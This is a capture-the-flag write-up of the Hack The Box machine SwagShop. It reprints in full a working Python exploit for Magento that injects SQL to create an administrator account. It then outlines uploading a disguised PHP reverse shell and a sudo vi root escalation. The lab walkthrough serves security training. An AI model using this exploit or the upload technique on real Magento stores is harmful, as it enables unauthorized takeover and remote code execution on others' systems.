---
title:     "Hack The Box - Swagshop"
tags: [linux,easy,sudo,php]
---

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-swagshop/1.png)

We are going to pwn SwagShop from Hack The Box.

Link : <https://www.hackthebox.eu/home/machines/profile/188>


Like always begin with our Nmap Scan.

## Nmap Scan Results:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Lets Begin with HTTP 
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-swagshop/2.png)
It is Magento 

>Magento is an open-source e-commerce platform written in PHP. It is one of the most popular open e-commerce systems in the network. 

Run Gobuster on background

GObuster Results:
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.140
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/27 09:57:45 Starting gobuster
===============================================================
/app (Status: 301)
/errors (Status: 301)
/favicon.ico (Status: 200)
/includes (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/lib (Status: 301)
/media (Status: 301)
/pkginfo (Status: 301)
/server-status (Status: 403)
/shell (Status: 301)
/skin (Status: 301)
/var (Status: 301)
===============================================================
2019/12/27 10:00:03 Finished
===============================================================
```

So I searched for exploits available, and I choose randomly
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-swagshop/3.png)

>https://www.exploit-db.com/exploits/37977

This script will create admin account with username ``forme`` and password ``forme``
I changed the script's target url and executed.

```
 
import requests
import base64
import sys

target = "http://10.10.10.140/"

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"

q="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""


query = q.replace("\n", "").format(username="forme", password="forme")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url, 
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter),
                        "forwarded": 1})
if r.ok:
    print "WORKED"
    print "Check {0}/admin with creds forme:forme".format(target)
else:
    print "DID NOT WORK"

```

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-swagshop/4.png)

It created an account , Now we can login with `` forme : forme ``

``http://10.10.10.140/index.php/admin``

and Im succesfully logged in.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-swagshop/5.png)

## Froghopper Attack

I searched for any ways to reverse shell once we get authenticated and I found this

>https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper

According to the exploit I need to first enable ``Symlink``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-swagshop/6.png)

Once its enabled 
We need to create Category so `` Catalog-> Manage Categories -> and add our malicious code with image ``.

I used pentest monkey reverse shell and added ``GIF89`` which makes the file as gif image.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-swagshop/7.png)


![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-swagshop/8.png)
Upload it and save category.
Once its done move to `` Newsletter -> Newsletter Templates `` and inject the payload
Click Preview Template and start listener on your machine.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-swagshop/9.png)

We got the shell.

## Privilege Escalation:

As always I started with ``sudo -l``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-swagshop/10.png)

It looks like ``/usr/bin/vi`` can run any files in ``/var/www/html`` as sudo without root password

>https://gtfobins.github.io/gtfobins/vi/

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-swagshop/11.png)
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-swagshop/12.png)

We goot Root!



